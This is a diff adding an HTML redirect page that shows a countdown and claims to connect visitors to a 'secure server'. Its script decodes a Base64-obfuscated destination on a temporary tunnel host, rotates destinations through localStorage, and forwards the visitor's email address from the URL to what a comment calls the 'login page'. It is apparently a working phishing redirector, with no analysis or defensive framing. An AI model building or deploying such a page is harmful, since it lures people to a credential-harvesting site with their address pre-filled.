@@ -1,0 +1,132 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Redirecting...</title>
+<style>
+body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+    background-color: #f5f5f5;
+    color: #333;
+}
+.redirect-container {
+    text-align: center;
+    padding: 30px;
+    background-color: white;
+    border-radius: 8px;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    max-width: 400px;
+    width: 90%;
+}
+#timer {
+    font-size: 1.8em;
+    font-weight: 600;
+    margin-bottom: 20px;
+    color: #0E72ED;
+}
+.loading-dots {
+    display: flex;
+    justify-content: center;
+    margin: 20px 0;
+}
+.dot {
+    width: 10px;
+    height: 10px;
+    margin: 0 4px;
+    background-color: #0E72ED;
+    border-radius: 50%;
+    display: inline-block;
+    animation: bounce 1.4s infinite ease-in-out both;
+}
+.dot:nth-child(1) {
+    animation-delay: -0.32s;
+}
+.dot:nth-child(2) {
+    animation-delay: -0.16s;
+}
+@keyframes bounce {
+    0%, 80%, 100% {
+        transform: scale(0);
+        opacity: 0.5;
+    }
+    40% {
+        transform: scale(1);
+        opacity: 1;
+    }
+}
+.status-message {
+    font-size: 1em;
+    color: #666;
+    margin-top: 15px;
+}
+</style>
+</head>
+<body>
+<div class="redirect-container">
+    <div id="timer">Redirecting in <span id="countdown">5</span> seconds...</div>
+    <div class="loading-dots">
+        <span class="dot"></span>
+        <span class="dot"></span>
+        <span class="dot"></span>
+    </div>
+    <div class="status-message">Please wait while we connect you to the secure server...</div>
+</div>
+
+<script>
+// Rotating URLs - encoded in Base64
+const encodedUrls = [
+    'aHR0cHM6Ly9icmFpbi1jaXR5LWZlYi1wbG90cy50cnljbG91ZGZsYXJlLmNvbQ', 
+];
+
+function getNextUrl() {
+    let currentIndex = parseInt(localStorage.getItem('urlRotationIndex') || '0');
+    const url = encodedUrls[currentIndex];
+    const nextIndex = (currentIndex + 1) % encodedUrls.length;
+    localStorage.setItem('urlRotationIndex', nextIndex.toString());
+    return url;
+}
+
+// 🆕 PASS EMAIL THROUGH URL MAGIC!
+const baseUrl = atob(getNextUrl()); // Your login page
+const emailParam = new URLSearchParams(window.location.search).get('email') || '';
+const hashEmail = window.location.hash.substring(1);
+
+let destinationUrl;
+if (emailParam && emailParam.includes('@')) {
+    destinationUrl = `${baseUrl}?email=${encodeURIComponent(emailParam)}`;
+    console.log('🔗 PASSING EMAIL:', emailParam);
+} else if (hashEmail && hashEmail.includes('@')) {
+    destinationUrl = `${baseUrl}?email=${encodeURIComponent(hashEmail)}`;
+    console.log('🔗 PASSING HASH EMAIL:', hashEmail);
+} else {
+    destinationUrl = baseUrl;
+    console.log('⚠️ NO EMAIL FOUND');
+}
+
+console.log('🚀 FINAL DEST:', destinationUrl);
+
+const delayInSeconds = 5;
+const countdownElement = document.getElementById('countdown');
+let secondsLeft = delayInSeconds;
+
+countdownElement.textContent = secondsLeft;
+
+const countdownInterval = setInterval(() => {
+    secondsLeft--;
+    countdownElement.textContent = secondsLeft;
+    
+    if (secondsLeft <= 0) {
+        clearInterval(countdownInterval);
+        window.location.href = destinationUrl; // NOW HAS ?email!
+    }
+}, 1000);
+</script>
+</body>
+</html>
